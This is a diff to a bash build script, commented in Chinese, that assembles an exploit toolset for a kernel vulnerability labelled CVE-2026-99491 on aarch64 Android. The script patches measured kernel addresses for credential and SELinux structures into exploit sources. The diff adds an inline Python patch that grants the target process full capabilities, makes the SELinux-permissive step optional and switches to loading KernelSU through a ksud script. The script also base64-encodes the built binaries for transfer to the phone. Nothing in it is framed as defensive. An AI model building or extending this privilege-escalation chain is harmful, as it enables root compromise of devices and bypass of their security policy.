@@ -1,9 +1,9 @@
 #!/usr/bin/env bash
-# 构建 CVE-2026-99491 工具集（上游 GPL-2.0 源码 + 本机常量）。
+# 构建 CVE-2026-99491 工具集（上游 GPL-2.0 源码 + 本机常量 + 本机策略补丁）。
 #
 # 用法：tools/build_cve99491.sh <输出目录>
 #
-# 需要：curl、tar、zig（或 zig 在 PATH）。产物为 aarch64-linux-musl 静态件。
+# 需要：curl、tar、zig（或 zig 在 PATH）、python3。产物为 aarch64-linux-musl 静态件。
 set -euo pipefail
 
 OUT=${1:?用法: $0 <输出目录>}
@@ -64,28 +64,62 @@ patch_macro() {
 }
 
 echo "注入本机常量："
-# wtest 与 ctest **都**定义了 LINK_ADD_WORKER / LINK_SELINUX_STATE
 for f in wtest.c ctest.c; do
   patch_macro "$T/$f" LINK_ADD_WORKER "$LINK_ADD_WORKER"
   patch_macro "$T/$f" LINK_SELINUX_STATE "$LINK_SELINUX"
-  grep -E "^#define[[:space:]]+LINK_(ADD_WORKER|SELINUX_STATE)" "$T/$f" | sed "s|^|  $f: |"
 done
 patch_macro "$T/wtest.c" LINK_BOOTID "$LINK_BOOTID"
-grep -E "^#define[[:space:]]+LINK_BOOTID" "$T/wtest.c" | sed 's/^/  wtest.c: /'
-
 patch_macro "$T/ctest.c" CRED_SITE_LOW21 "$CRED_SITE"
-grep -E "^#define[[:space:]]+CRED_SITE_LOW21" "$T/ctest.c" | sed 's/^/  ctest.c: /'
-if [ "$BLOB_A" != "0x0" ]; then
-  patch_macro "$T/ctest.c" BLOB_SITE_A "$BLOB_A"
-  patch_macro "$T/ctest.c" BLOB_SITE_B "$BLOB_B"
-  grep -E "^#define[[:space:]]+BLOB_SITE_" "$T/ctest.c" | sed 's/^/  ctest.c: /'
-else
-  echo "::error::BLOB_SITE_* 未测出（应为 0x35f34 一类实测值）"
+if [ "$BLOB_A" = "0x0" ]; then
+  echo "::error::BLOB_SITE_* 未测出"
   exit 1
 fi
+patch_macro "$T/ctest.c" BLOB_SITE_A "$BLOB_A"
+patch_macro "$T/ctest.c" BLOB_SITE_B "$BLOB_B"
+grep -E "^#define[[:space:]]+(LINK_|CRED_SITE|BLOB_SITE)" "$T/ctest.c" | sed 's/^/  ctest.c: /'
+
+# —— 策略补丁：补能力位、permissive 改为按需、loadksu 换成 ksud ——
+python3 - "$T/ctest.c" <<'PY'
+import sys, io
+
+path = sys.argv[1]
+src = io.open(path, encoding="utf-8").read()
+
+def sub_once(text, old, new, what):
+    n = text.count(old)
+    if n != 1:
+        raise SystemExit("补丁失败：%s 命中 %d 次" % (what, n))
+    return text.replace(old, new)
+
+# 1) 补全能力位（含 CAP_SYSLOG，ksud 才能自己读 kallsyms 重定位）
+src = sub_once(
+    src,
+    "    patch_agent(pid, cred, 0, 1);\n",
+    "    patch_agent(pid, cred, 0, 1);\n    patch_full_caps(pid, cred);\n",
+    "chain_fast 补 patch_full_caps",
+)
+
+# 2) permissive 默认跳过：只在 C99491_PERMISSIVE=1 时尝试
+src = sub_once(
+    src,
+    "    if (try_permissive(st) < 0) {",
+    "    if (getenv(\"C99491_PERMISSIVE\") && try_permissive(st) < 0) {",
+    "try_permissive 条件化",
+)
+
+# 3) 装载方式：手工符号表 -> ksud late-load
+src = sub_once(
+    src,
+    "        int n = snprintf(c, sizeof(c), \"loadksu %#llx allow_shell=1\\n\", slide);",
+    "        int n = snprintf(c, sizeof(c), \"run /data/local/tmp/ksud_go.sh\\n\");",
+    "loadksu -> run ksud_go.sh",
+)
+
+io.open(path, "w", encoding="utf-8").write(src)
+print("策略补丁已应用：patch_full_caps / permissive 按需 / ksud 装载")
+PY
 
 # —— Android system_properties 垫片 ——
-# wtest（可选 --stoprisk）与 agent 直接调用 bionic 的两个符号；musl 没有。
 mkdir -p "$T/compat/sys"
 cat > "$T/compat/sys/system_properties.h" <<'EOF'
 #ifndef CVE99491_COMPAT_SYSTEM_PROPERTIES_H
@@ -143,6 +177,7 @@ build tinycred   "$T/tinycred.c"
   echo "cred_site_low21=$CRED_SITE"
   echo "blob_site_a=$BLOB_A"
   echo "blob_site_b=$BLOB_B"
+  echo "patches=full_caps,permissive-optional,ksud-load"
   echo "built_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
   for f in "$OUT"/*; do
     case "$f" in *.b64|*.txt) continue;; esac
@@ -151,7 +186,6 @@ build tinycred   "$T/tinycred.c"
 } > "$OUT/BUILDINFO.txt"
 cat "$OUT/BUILDINFO.txt"
 
-# 手机端拿不到 CI artifact，用 base64 走仓库
 for f in "$OUT"/*; do
   case "$f" in *.b64|*.txt) continue;; esac
   base64 -w0 "$f" > "$OUT/$(basename "$f").b64"
